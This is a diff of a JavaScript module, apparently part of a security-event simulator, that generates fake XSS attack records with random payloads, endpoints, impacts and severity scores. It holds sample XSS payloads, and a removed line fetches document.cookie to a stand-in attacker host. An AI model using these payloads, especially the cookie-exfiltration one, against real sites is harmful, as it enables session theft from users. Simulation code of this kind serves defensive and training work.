@@ -1,42 +1,70 @@
 const { generateRandomIP } = require('../utils/generators');
 
 /**
- * XSS payload types and examples
+ * XSS payload templates for different attack types
  */
 const XSS_PAYLOADS = [
-  { payload: '<script>alert("XSS")</script>', type: 'Reflected' },
-  { payload: '<img src=x onerror="alert(\'XSS\')">', type: 'DOM-based' },
-  { payload: '<svg/onload=alert("XSS")>', type: 'Stored' },
-  { payload: '"><script>fetch("http://attacker.com/?c="+document.cookie)</script>', type: 'Reflected' },
-  { payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>', type: 'DOM-based' },
+  { payload: "<script>alert('XSS')</script>", type: 'Stored' },
+  { payload: '<img src=x onerror=alert(1)>', type: 'Reflected' },
+  { payload: "<iframe src=javascript:alert('XSS')></iframe>", type: 'DOM-based' },
+  { payload: "'-alert(1)-'", type: 'Reflected' },
 ];
 
 /**
- * Generates random exposed data from XSS attack
- * @returns {Object} Exposed data object
+ * Vulnerable endpoints that can be targeted
  */
-function generateExposedData() {
-  return {
-    cookiesStolen: Math.floor(Math.random() * 100) + 10,
-    sessionTokensStolen: Math.floor(Math.random() * 50) + 5,
-    usersAffected: Math.floor(Math.random() * 200) + 20,
-  };
+const VULNERABLE_ENDPOINTS = ['/search', '/comments', '/profile', '/dashboard'];
+
+/**
+ * Possible impacts from successful XSS attacks
+ */
+const XSS_IMPACTS = ['Cookie theft', 'Session hijacking', 'Defacement', 'Redirection'];
+
+/**
+ * Calculates severity based on XSS type and impact
+ * @param {string} type - XSS type (Stored, Reflected, DOM-based)
+ * @param {string} impact - Impact type
+ * @returns {string} Severity level (Low, Medium, High, Critical)
+ */
+function calculateSeverity(type, impact) {
+  // Base severity by type
+  let baseSeverity = 0;
+
+  if (type === 'Stored') {
+    // Stored XSS is most dangerous as it affects all users
+    baseSeverity = 3;
+  } else if (type === 'DOM-based') {
+    // DOM-based is dangerous
+    baseSeverity = 2;
+  } else if (type === 'Reflected') {
+    // Reflected is less dangerous as it requires user interaction
+    baseSeverity = 1;
+  }
+
+  // Increase severity based on impact
+  if (impact === 'Session hijacking' || impact === 'Cookie theft') {
+    baseSeverity += 2;
+  } else if (impact === 'Defacement' || impact === 'Redirection') {
+    baseSeverity += 1;
+  }
+
+  if (baseSeverity <= 2) return 'Low';
+  if (baseSeverity <= 3) return 'Medium';
+  if (baseSeverity <= 4) return 'High';
+  return 'Critical';
 }
 
 /**
- * Calculates severity based on success and exposed data
- * @param {boolean} success - Whether the XSS attack was successful
- * @param {Object} exposedData - Data that was exposed
- * @returns {string} Severity level
+ * Generates a target URL with injected XSS payload
+ * @param {string} endpoint - Target endpoint
+ * @param {string} payload - XSS payload
+ * @returns {string} Target URL with encoded payload
  */
-function calculateSeverity(success, exposedData) {
-  if (!success) return 'Low';
-
-  const totalExposed = exposedData.cookiesStolen + exposedData.sessionTokensStolen + exposedData.usersAffected;
-
-  if (totalExposed <= 100) return 'Medium';
-  if (totalExposed <= 300) return 'High';
-  return 'Critical';
+function generateTargetURLWithPayload(endpoint, payload) {
+  // In real scenarios, payloads would be URL-encoded
+  // For simulation, we'll show the injection point
+  const encodedPayload = encodeURIComponent(payload);
+  return `http://vulnerable-app.com${endpoint}?input=${encodedPayload}`;
 }
 
 /**
@@ -44,31 +72,32 @@ function calculateSeverity(success, exposedData) {
  * @returns {Object} XSS attack object with all simulation data
  */
 function simulateXSSAttack() {
-  // Determine if attack is successful (40% success, 60% failure)
+  // Determine if attack is successful (40% success, 60% failure due to input validation)
   const success = Math.random() < 0.4;
 
-  // Select random payload
+  // Select random payload and vulnerable endpoint
   const payloadObj = XSS_PAYLOADS[Math.floor(Math.random() * XSS_PAYLOADS.length)];
+  const targetEndpoint = VULNERABLE_ENDPOINTS[Math.floor(Math.random() * VULNERABLE_ENDPOINTS.length)];
 
-  // Generate exposed data only if successful
-  const exposedData = success ? generateExposedData() : null;
+  // Select impact (only relevant if attack succeeds)
+  const impact = XSS_IMPACTS[Math.floor(Math.random() * XSS_IMPACTS.length)];
 
-  // Determine attack complexity
-  const attackComplexities = ['Low', 'Medium', 'High'];
-  const attackComplexity = attackComplexities[Math.floor(Math.random() * attackComplexities.length)];
+  // Generate target URL with payload
+  const targetURL = generateTargetURLWithPayload(targetEndpoint, payloadObj.payload);
 
   // Calculate severity
-  const severity = calculateSeverity(success, exposedData);
+  const severity = calculateSeverity(payloadObj.type, success ? impact : 'None');
 
   return {
     sourceIP: generateRandomIP(),
-    targetURL: ['/', '/dashboard', '/profile', '/search', '/admin'][Math.floor(Math.random() * 5)],
+    targetEndpoint: targetEndpoint,
+    targetURL: targetURL,
     payload: payloadObj.payload,
     xssType: payloadObj.type,
-    attackComplexity: attackComplexity,
     success: success,
-    dataExposed: exposedData,
+    impact: success ? impact : null,
     severity: severity,
+    inputValidationBypassed: success,
     timestamp: new Date().toISOString(),
   };
 }
